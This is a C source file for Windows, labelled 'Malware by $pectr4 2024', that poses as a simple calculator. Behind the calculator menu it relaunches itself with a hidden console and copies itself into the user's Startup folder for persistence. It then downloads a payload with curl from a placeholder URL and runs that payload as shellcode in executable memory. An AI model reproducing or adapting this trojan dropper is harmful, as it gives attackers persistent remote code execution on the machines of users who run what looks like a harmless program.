/*

Malware by $pectr4 2024
https://github.com/SpectrTech

*/

#include <stdio.h>
#include <stdint.h>
#include <string.h>

#include <direct.h>
#include <windows.h>

#define PAYLOAD "http://example.com/payload.bin"

int check_payload(void) {
	char path[MAX_PATH];
	snprintf(path, MAX_PATH, "C:\\Windows\\TEMP\\o.bin");

	FILE* payload_fp = (FILE*)fopen(path, "rb");
	if (payload_fp == NULL) return 0;

	fclose(payload_fp);
	return 1;
}

int check_autorun(char* argv[]) {
	char path[MAX_PATH];
	snprintf(path, MAX_PATH, "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\%s", getenv("USERNAME"), argv[0]);
	
	FILE* script_fp = (FILE*)fopen(path, "rb");
	if (script_fp == NULL) return 0;
	
	fclose(script_fp);
	return 1;
}

void copy_to_autorun(char* argv[]) {
	char path[MAX_PATH];
	snprintf(path, MAX_PATH, "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\%s", getenv("USERNAME"), argv[0]);

	FILE* script_src_fp = (FILE*)fopen(argv[0], "rb");
	if (script_src_fp == NULL) return;

	fseek(script_src_fp, 0L, SEEK_END);
	int script_fsize = ftell(script_src_fp);
	fseek(script_src_fp, 0L, SEEK_SET);

	char* script_src_content = malloc(script_fsize);
	if (script_src_content == NULL) {
		fclose(script_src_fp);
		return ;
	}

	fread(script_src_content, 1, script_fsize, script_src_fp);
	fclose(script_src_fp);

	FILE* script_dst_fp = (FILE*)fopen(path, "wb");
	if (script_dst_fp == NULL) return;

	fwrite(script_src_content, 1, script_fsize, script_dst_fp);
	fclose(script_dst_fp);
}

int main(int argc, char* argv[]) {
	if (argc == 2 && strcmp(argv[1], "--d2913731286a0e5019d30d9474838969") == 0) {
		autorun:
		HWND console = GetConsoleWindow();
		ShowWindow(console, SW_HIDE);

		if (!check_autorun(argv)) copy_to_autorun(argv);
		if (!check_payload()) {
			char command[sizeof(PAYLOAD) + 42];
			snprintf(command, sizeof(command), "curl %s -o C:\\Windows\\TEMP\\o.bin", PAYLOAD);
			if (system(command) != 0) return -1;
		}

		FILE* payload_fp = (FILE*)fopen("C:\\Windows\\TEMP\\o.bin", "rb");
		if (payload_fp == NULL) return -1;

		fseek(payload_fp, 0L, SEEK_END);
		uint32_t payload_fsize = ftell(payload_fp);
		fseek(payload_fp, 0L, SEEK_SET);

		unsigned char* shellcode = malloc(payload_fsize);
		if (shellcode == NULL) goto cleanup;

		fread(shellcode, 1, payload_fsize, payload_fp);
		fclose(payload_fp);

		HANDLE shellcode_mem = VirtualAlloc(0, payload_fsize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (shellcode_mem == NULL) goto cleanup;

		memcpy(shellcode_mem, shellcode, payload_fsize);
		void (*exec)(void) = (void(*)())shellcode_mem;
		exec();

		cleanup:
		if (payload_fp != NULL) fclose(payload_fp);
		if (shellcode != NULL) free(shellcode);
		if (shellcode_mem != NULL) VirtualFree(shellcode_mem, 0, MEM_RELEASE);
	}
	else {
		char cwd[MAX_PATH];

		if (_getcwd(cwd, MAX_PATH) != NULL)
			if (strcmp(cwd, "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\") == 0 || strcmp(cwd, "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup") == 0) goto autorun;

		char command[512];
		snprintf(command, 512, "C:\\Windows\\system32\\cmd.exe /c .\\%s --d2913731286a0e5019d30d9474838969", argv[0]);
		system(command);

		printf("Simple Calculator in C | v0.1\n\n");

		printf("1. Add      (+)\n");
		printf("2. Subtract (-)\n");
		printf("3. Multiply (*)\n");
		printf("4. Divide   (:)\n\n");

		printf("> ");
		int choice;
		scanf("%d", &choice);

		if (choice != 1 && choice != 2 && choice != 3 && choice != 4) return -1;
		
		double num1, num2;

		printf("\nFirst num: ");
		scanf("%lf", &num1);

		printf("Second num: ");
		scanf("%lf", &num2);

		double result;
		if (choice == 1) result = num1 + num2;
		if (choice == 2) result = num1 - num2;
		if (choice == 3) result = num1 * num2;
		if (choice == 4) result = num1 / num2;

		printf("\nResult: %lf\n", result);
	}

	return 0;
}